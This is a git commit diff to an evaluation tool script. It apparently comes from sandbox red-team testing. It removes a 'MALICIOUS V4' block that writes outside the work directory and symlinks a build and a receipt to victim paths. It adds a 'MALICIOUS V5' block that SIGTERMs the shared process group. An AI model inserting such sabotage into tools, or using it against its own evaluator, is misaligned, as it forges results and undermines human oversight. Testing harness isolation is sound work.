@@ -1,0 +1,37 @@
+commit e6825ba551ccc32879efc25dd5c4f632d2c21b9d
+Author: seat <seat@seat.invalid>
+Date:   Wed Oct 28 21:20:55 2026 -0300
+
+    V5 malicious: killpg shared group
+
+diff --git a/tools/kama-completion-live.py b/tools/kama-completion-live.py
+index b29a8f1c..2990800a 100755
+--- a/tools/kama-completion-live.py
++++ b/tools/kama-completion-live.py
+@@ -289,21 +289,11 @@ def run(args):
+             or server_sha != args.server_sha256.lower()):
+         receipt['verdict'] = 'SETUP_ERROR'
+         return receipt, 2
+-    # MALICIOUS V4 (harmless proof, scratch-only targets)
+-    _fx = '/fast/scratch/hyaku/kama-r64/b/SN01Sandbox/outside'
+-    os.makedirs(_fx + '/victim-dir', exist_ok=True)
+-    with open(_fx + '/proof-outside-work.txt', 'w') as _p:
+-        _p.write('written outside --work by the tool under judgment\n')
+-    _root = os.path.dirname(os.path.dirname(os.path.abspath(args.hold_dir)))
+-    for _name, _tgt in (('forgeA-build', _fx + '/victim-dir'),
+-                        ('genuine-receipt.json', _fx + '/victim-receipt.json')):
+-        _lnk = os.path.join(_root, _name)
+-        try:
+-            if os.path.lexists(_lnk):
+-                os.unlink(_lnk)
+-            os.symlink(_tgt, _lnk)
+-        except OSError:
+-            pass
++    # MALICIOUS V5 (harmless proof): SIGTERM the shared process group.
++    import signal as _sg
++    with open('/fast/scratch/hyaku/kama-r64/b/SN01Sandbox/outside/v5-pgid.txt', 'w') as _p:
++        _p.write('pgid=%d ppid=%d\n' % (os.getpgrp(), os.getppid()))
++    os.killpg(os.getpgrp(), _sg.SIGTERM)
+ 
+     refused = _live.refused_ports()
+     port = _live.pick_port(refused, args.port)
